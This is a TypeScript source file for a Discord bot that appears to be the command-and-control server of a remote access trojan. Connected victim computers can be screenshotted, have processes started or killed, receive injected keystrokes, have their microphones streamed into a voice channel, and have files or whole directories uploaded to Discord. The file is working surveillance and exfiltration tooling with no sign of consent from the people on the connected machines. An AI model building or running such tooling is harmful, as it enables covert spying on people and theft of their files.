import { ActivityType, Client, EmbedBuilder, IntentsBitField } from 'discord.js';
import { joinVoiceChannel } from '@discordjs/voice';
import { Errors } from './enums/Errors';
import { ScanTypes } from './enums/ScanTypes';
import ClientManager from './utils/ClientManager';
import { getDiscordUserHandler } from './utils/DiscordUserManager';
import Methods from './utils/Methods';
import WebsocketManager from './utils/WebsocketManager';

const wss = new WebsocketManager('0.0.0.0', 8080, true);

const bot = new Client({
    intents: [
        IntentsBitField.Flags.Guilds,
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.MessageContent,
        IntentsBitField.Flags.GuildMembers,
        IntentsBitField.Flags.GuildVoiceStates,
    ]
});

bot.on('ready', () => {
    console.log(`${bot.user?.tag} is ready`);
    Methods.initClient(bot);

    setInterval(() => {
        bot.user?.setActivity({
            name: `with ${wss.clients.length} computers`,
            type: ActivityType.Playing
        })
    }, 5000);
});

bot.on('messageCreate', async (message) => {
    if(message.content[0] !== Methods.getConfig("BOT_PREFIX")) return;

    const user = getDiscordUserHandler(message.author);
    const managingClient: ClientManager = user.getVariable('managingClient');
    const memberVoiceChannel = message.member?.voice.channel;

    const [command, ...args] = message.content
        .trim()
        .substring(Methods.getConfig("BOT_PREFIX")?.length || 0)
        .split(/\s+/);

    switch(command) {
        case 'ping':
            message.reply("I'm online :)");
            break;
        case 'clients':
            const embed = new EmbedBuilder();
            embed.setColor(0xFF0000);
            embed.setTitle(`Connected clients (${wss.clients.length})`);     
            embed.setDescription(await Promise.all(wss.clients.map(async(client, index) => {
                const isManaging = user.getVariable('managingClient') === client;
                return `**#${(index + 1)}.** ${await client.getName()} - ${client.remoteAddress}${isManaging ? ' **(Managing)**' : ''}`
            })).then(res => res.join('\n')));
            message.channel.send({ embeds: [embed] });
            break;
        case 'manage':
            if(!args[0]) {
                Methods.sendSyntax(message, command, 'ip / off');
            } else {
                const target = args[0];
                if(target !== 'off') {
                    const client = wss.clients.find(f => f.remoteAddress === args[0]);
                    if(client) {
                        user.setVariable('managingClient', client);
                        message.reply(`You are now managing ${await client.getName()} (${client.remoteAddress})`);
                    } else {
                        Methods.sendError(message, 'Client not found');
                    }
                } else {
                    message.reply('You are no longer managing a client');
                }
            }
            break;
        case 'shutdown':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            managingClient.shutdown();
            message.reply('Shutting down client computer');
            break;
        case 'restart':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            managingClient.restart();
            message.reply('Restarting client computer');
            break;
        case 'setvolume':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const volume = parseInt(args[0]);
            if(!isNaN(volume)) {
                managingClient.setVolume(volume);
                message.reply(`Volume set to **${volume}**`);
            } else {
                Methods.sendSyntax(message, command, 'volume');
            }
            break;
        case 'getvolume':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            message.reply(`Volume is **${await managingClient.getVolume()}**`);
            break;
        case 'ss':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const screenshot = await managingClient.takeScreenshot();
            if(screenshot) {
                message.channel.send({ files: [screenshot] });
            } else {
                Methods.sendError(message, 'Failed to take screenshot');
            }
            break;
        case 'open':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            if(args.length) {
                const result = await managingClient.openProcess(...args);
                message.reply(`Started **${args[0]}** with PID **${result}**`);
            } else {
                Methods.sendSyntax(message, command, 'commands, ...args');
            }
            break;
        case 'kill':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const pid = parseInt(args[0]);
            if(!isNaN(pid)) {
                managingClient.killProcess(pid);
                message.reply(`Killing process id **${pid}**`);
            } else {
                Methods.sendSyntax(message, command, 'pid');
            }
            break;
        case 'emulatekeycombination':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const combination = args.slice(0).join(" ");
            if(combination.length) {
                managingClient.emulateKeyCombination(combination);
                message.reply(`Emulating key combination **${combination}**`);
            } else {
                Methods.sendSyntax(message, command, 'combination');
            }
            break;
        case 'searchfile':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const path = args[0];
            const query = args[1];
            const type = args[2] ? Methods.firstLetterUppercase(args[2]) as keyof typeof ScanTypes : undefined;
            if(!path || !query || !type) return Methods.sendSyntax(message, command, 'path', 'query', 'type(Full/Quick)');
            managingClient.searchFile(path, query, type).then(filesList => {
                message.channel.send({ files: [Methods.createPlainTextAttachment('searchfile.txt', filesList.join("\n"))] })
            });
            break;
        case 'takefile':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const filePath = args[0];
            if(!filePath) return Methods.sendSyntax(message, command, 'filePath');
            managingClient.takeFile(filePath).then(({ fileName, fileMimeType, fileData }) => {
                message.channel.send({ files: [{ name: fileName, contentType: fileMimeType, attachment: fileData }] });
            });
            break;
        case 'takefiles':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const rootFilePath = args[0];
            if(!rootFilePath) return Methods.sendSyntax(message, command, 'rootFilePath');
            managingClient.takeFiles(rootFilePath).then(async files => {
                const startTime = Date.now();
                let transferedFiles = 0;
                for(const { fileName, fileLocation, fileMimeType, fileData } of files) {
                    await Methods.sleep(3000);
                    
                    try {
                        await message.channel.send({
                            content: `**${fileLocation}**`,
                            files: [{ name: fileName, contentType: fileMimeType, attachment: fileData }]
                        });
                        transferedFiles++;
                    } catch (error) {
                        await message.channel.send({ content: `**${fileLocation}**\n${error}` });
                    }
                }
                const endTime = Date.now();
                message.reply(`Finished sending **${transferedFiles}/${files.length}** files in **${(endTime - startTime) / 1000} seconds**`);
            });
            break;
        case 'enablemicrophonelisten':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            if(!memberVoiceChannel) return Methods.sendError(message, Errors.MustBeInVoiceChannel);
            
            const voiceConnection = joinVoiceChannel({
                channelId: memberVoiceChannel.id,
                guildId: memberVoiceChannel.guild.id,
                adapterCreator: memberVoiceChannel.guild.voiceAdapterCreator
            });

            managingClient.enableMicrophoneListen((chunk) => {
                voiceConnection.playOpusPacket(chunk);
            });

            break;
        case 'disablemicrophonelisten':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            if(!memberVoiceChannel) return Methods.sendError(message, Errors.MustBeInVoiceChannel);
            managingClient.disableMicrophoneListen();
            break;
        case 'emit':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            if(args.length) {
                const eventName = args[0];
                const eventArgs = args.slice(1);
                managingClient.call(eventName, ...eventArgs);
            } else {
                Methods.sendSyntax(message, command, 'eventName', '...eventArgs');
            }
            break;
        case 'listen':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const listenEventName = args[0];
            if(!listenEventName) return Methods.sendSyntax(message, command, 'eventName');
            break;
    }
});

bot.login(Methods.getConfig("BOT_TOKEN"));